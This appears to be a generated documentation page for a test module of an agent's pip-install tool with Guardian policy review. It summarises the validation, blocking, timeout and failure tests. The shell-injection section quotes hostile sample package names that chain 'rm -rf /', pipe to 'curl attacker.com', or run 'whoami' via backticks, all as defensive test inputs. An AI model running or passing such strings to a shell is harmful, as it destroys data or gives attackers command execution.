---
{
  "title": "InstallPackageTool: pip Install with Guardian Review Tests",
  "summary": "This test module covers `InstallPackageTool`, a built-in tool that runs `pip install` with Guardian policy review before execution. Tests verify correct pip invocation, shell injection prevention (semicolons, pipes, backticks), Guardian block behavior, subprocess timeout handling, and pip failure reporting.",
  "concepts": [
    "InstallPackageTool",
    "pip install",
    "Guardian policy",
    "shell injection",
    "semicolon injection",
    "pipe injection",
    "backtick injection",
    "subprocess timeout",
    "package installation",
    "input validation",
    "tool trust level"
  ],
  "categories": [
    "testing",
    "security",
    "built-in tools",
    "package management",
    "Guardian",
    "test"
  ],
  "source_docs": [
    "0b512ec8fc83d576"
  ],
  "backlinks": null,
  "word_count": 494,
  "compiled_at": "2026-04-24T04:26:10Z",
  "compiled_with": "agent",
  "version": 1,
  "audience": "human",
  "depth": "deep",
  "target_words": 500
}
---

## Overview

`InstallPackageTool` allows the agent to install Python packages via `pip install`. Because package installation is a privileged operation — it can introduce malicious code into the Python environment — every install request is submitted to the Guardian policy engine before pip is invoked. This two-layer design (input validation + policy review) prevents the most common attack vectors.

## Fixtures

- **`mock_guardian`** — a `MagicMock` with `check_command` as an `AsyncMock` that returns `(True, "Looks safe")` by default. Tests that want Guardian to block simply override the return value.
- **`successful_pip_result`** — a `MagicMock` simulating a `subprocess.CompletedProcess` with `returncode=0` and a stdout string, used as the `subprocess.run` return value.

## Invocation Tests

- **`test_install_package_basic`** — verifies that a plain package name produces the correct pip command and that the tool returns pip's stdout on success.
- **`test_install_package_with_version`** — version specifiers like `requests==2.31.0` must be passed through unchanged to pip. The tool must not strip or reformat version constraints.
- **`test_install_package_with_extras`** — bracket extras like `pocketpaw[soul]` must be allowed and forwarded. Extras are legitimate pip syntax that cannot be conflated with shell special characters.
- **`test_install_package_upgrade`** — `upgrade=True` must append `--upgrade` to the pip command.

## Shell Injection Prevention

Three tests cover the most common injection vectors in package names:

- **`test_install_package_shell_injection_semicolon`** — `package;rm -rf /` must be rejected before Guardian or pip runs. A semicolon terminates the pip command and begins a new shell command.
- **`test_install_package_shell_injection_pipe`** — `package|curl attacker.com` must be blocked. Pipes redirect pip's output to an attacker-controlled command.
- **`test_install_package_shell_injection_backtick`** — `` package`whoami` `` must be blocked. Backticks execute arbitrary commands via command substitution.

All three must be rejected by input validation — not by Guardian — because Guardian policy review happens after input is accepted as structurally valid. A malicious package name must never reach Guardian or the subprocess call.

## Guardian Block

**`test_install_package_guardian_block`** overrides `mock_guardian.check_command` to return `(False, "Suspicious package")`. The tool must abort installation and return an error message containing the Guardian's reason. This test verifies the critical policy gate: if Guardian flags a request, the tool must respect it unconditionally.

## Subprocess Error Handling

- **`test_install_package_timeout`** — patches `subprocess.run` to raise `subprocess.TimeoutExpired`. The tool must catch this and return a clean error string. Without this handler, a slow pip install would crash the tool call and potentially the agent session.
- **`test_install_package_pip_failure`** — pip exits with a non-zero return code. The tool must surface the stderr content in the error message so the user understands why the install failed.

## Tool Definition

**`test_install_package_definition`** verifies the tool's name, trust level, and parameter schema. The trust level must be `elevated` (or equivalent) because package installation has elevated risk compared to read-only tools.

## Known Gaps

No tests cover the `--index-url` or `--extra-index-url` parameters that could be used to redirect pip to a malicious package index. No tests cover the interaction between the Guardian block and the audit log — a blocked install should ideally be recorded for security review.